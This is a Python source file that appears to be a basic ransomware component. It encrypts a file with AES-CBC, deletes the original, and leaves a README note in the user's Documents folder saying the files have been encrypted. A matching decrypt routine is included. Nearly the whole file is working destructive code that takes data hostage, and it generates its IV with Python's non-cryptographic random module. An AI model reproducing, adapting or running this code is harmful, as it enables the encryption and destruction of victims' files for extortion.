import os, random
from Crypto.Cipher import AES
from os.path import expanduser


def let_a_note():
    note = 'Oups, your files has been encrypted !!!'
    readme_file = expanduser("~") + "\\Documents\\README.txt"

    with open(readme_file, 'wb') as note_file:
        note_file.write(note)
        note_file.close()

def encrypt_file(key, filename):
    chunksize = 65536
    dictionnary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ02133456789'

    file_name_without_extension, file_extension = os.path.splitext(filename)
    file_extension += ' ' * (16 - (len(file_extension) % 16))

    encrypt_file = file_name_without_extension + '.enc'
    IV = ''

    for i in range(16):
        random_letter_dictionnary = random.choice(dictionnary)
        IV += random_letter_dictionnary
    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as file_handler:
        with open(encrypt_file, 'wb') as outputfile_handler:
            outputfile_handler.write(file_extension)
            outputfile_handler.write(IV)

            while True:
                chunk_read = file_handler.read(chunksize)

                if len(chunk_read) == 0:
                    break
                elif len(chunk_read) % 16 != 0:
                    chunk_read += ' ' * (16 - (len(chunk_read) % 16))
                outputfile_handler.write(encryptor.encrypt(chunk_read))
    os.unlink(filename)

    let_a_note()


def decrypt_file(key, encrypt_file, out_filename):
    chunksize = 65536
    with open(encrypt_file, 'rb') as encrypt_file_handler:
        extension_with_16_characters = encrypt_file_handler.read(16)
        extension_without_16_characters = ''

        for letter in extension_with_16_characters:
            if letter == ' ':
                pass
            else:
                extension_without_16_characters += letter

        IV = encrypt_file_handler.read(32 - 16)
        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(out_filename + extension_without_16_characters, 'wb') as outfile:
            while True:
                chunk = encrypt_file_handler.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
    os.unlink(encrypt_file)
